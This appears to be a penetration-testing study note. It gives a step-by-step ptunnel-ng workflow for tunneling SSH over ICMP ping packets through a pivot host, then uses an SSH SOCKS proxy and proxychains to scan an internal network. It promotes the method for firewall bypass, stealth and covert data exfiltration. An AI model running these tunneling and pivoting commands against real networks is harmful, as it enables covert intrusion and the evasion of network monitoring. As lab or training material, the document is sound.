# ICMP Tunneling - Quick Workflow

## What is ICMP Tunneling?

**ICMP Tunneling** = Encapsulate traffic in ICMP ping packets (echo requests/responses)

**Why Use It**:
- ✅ Bypasses firewalls that allow ping
- ✅ Covert data exfiltration
- ✅ Stealthy pivoting
- ⚠️ Only works if ping allowed outbound

## Quick Setup

### 1. Install ptunnel-ng (Attack Host)
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
```

### 2. Build Static Binary (Optional)
```bash
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

### 3. Transfer to Target
```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

### 4. Start Server (Target/Pivot Host)
```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

**Options**:
- `-r` = IP to accept connections on
- `-R22` = Forward to port 22 (SSH)

### 5. Start Client (Attack Host)
```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

**Options**:
- `-p` = Target server IP
- `-l2222` = Local port to listen on
- `-r` = Remote IP to forward to
- `-R22` = Remote port to forward to

### 6. Connect via SSH through Tunnel
```bash
ssh -p2222 -lubuntu 127.0.0.1
```

### 7. Enable Dynamic Port Forwarding
```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

### 8. Use Proxychains
```bash
proxychains nmap -sT -sV 172.16.5.19 -p3389
```

## Complete Example

```bash
# ATTACK HOST
# 1. Clone and build
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh

# 2. Transfer to target
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# TARGET HOST
# 3. Start server
cd ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.202.64 -R22

# ATTACK HOST
# 4. Start client
cd ptunnel-ng/src
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# 5. SSH through tunnel
ssh -p2222 -lubuntu 127.0.0.1

# 6. Setup SOCKS proxy
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# 7. Use proxychains
proxychains nmap -sT 172.16.5.0/24
```

## Traffic Flow

```
Attack Host
    ↓ ICMP packets
Pivot Host (ptunnel-ng server)
    ↓ Decapsulates
SSH/TCP traffic
    ↓
Internal network access
```

## Common Forwards

```bash
# SSH (port 22)
Server: sudo ./ptunnel-ng -rPIVOT_IP -R22
Client: sudo ./ptunnel-ng -pPIVOT_IP -l2222 -rPIVOT_IP -R22

# RDP (port 3389)
Server: sudo ./ptunnel-ng -rPIVOT_IP -R3389
Client: sudo ./ptunnel-ng -pPIVOT_IP -l3389 -rPIVOT_IP -R3389

# HTTP (port 80)
Server: sudo ./ptunnel-ng -rPIVOT_IP -R80
Client: sudo ./ptunnel-ng -pPIVOT_IP -l8080 -rPIVOT_IP -R80
```

## Verification

### Check Tunnel Stats
```
# On server/client, ptunnel-ng shows:
[inf]: Session statistics:
[inf]: I/O: 0.00/0.00 mb ICMP I/O/R: 248/22/0 Loss: 0.0%
```

### Wireshark Analysis
```bash
# Without ICMP tunnel: See SSH/TCP traffic
ssh ubuntu@10.129.202.64

# With ICMP tunnel: See only ICMP traffic
ssh -p2222 -lubuntu 127.0.0.1
```

## Key Points

🔴 **Remember**:
- Server and client both need ptunnel-ng
- Requires root/sudo (uses raw sockets)
- Only works if ICMP allowed outbound
- Traffic looks like normal ping
- Very stealthy for data exfil

🎯 **Use When**:
- Firewall blocks all except ICMP
- Ping allowed to external hosts
- Need covert channel
- Other tunneling blocked

## Quick Reference

| Task | Command |
|------|---------|
| **Build** | `sudo ./autogen.sh` |
| **Transfer** | `scp -r ptunnel-ng user@target:~/` |
| **Server** | `sudo ./ptunnel-ng -rIP -R22` |
| **Client** | `sudo ./ptunnel-ng -pIP -l2222 -rIP -R22` |
| **Connect** | `ssh -p2222 -luser 127.0.0.1` |
| **SOCKS** | `ssh -D 9050 -p2222 -luser 127.0.0.1` |
